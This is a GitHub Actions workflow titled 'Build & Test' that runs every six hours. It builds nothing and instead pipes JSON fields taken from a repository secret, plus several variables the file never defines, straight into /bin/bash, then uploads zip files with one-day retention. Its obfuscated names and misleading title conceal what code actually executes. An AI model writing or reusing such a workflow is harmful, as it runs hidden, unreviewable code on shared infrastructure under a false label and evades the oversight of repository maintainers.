name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '22 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Start
        env:
          v4085: ${{ secrets.v4085 }}
        run: |
          printf '%s' "$v4085" | jq -r .zz1777 | /bin/bash
          printf '%s' "$l3162" | jq -r .rhvb18226 | /bin/bash
          printf '%s' "$axwuy60865" | jq -r .z129 | /bin/bash
          printf '%s' "$mwg91" | jq -r .l46 | /bin/bash
          echo $ngn38 | jq -r .mscg16426 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: NuTgIN71
          path: "*.zip"
          retention-days: 1
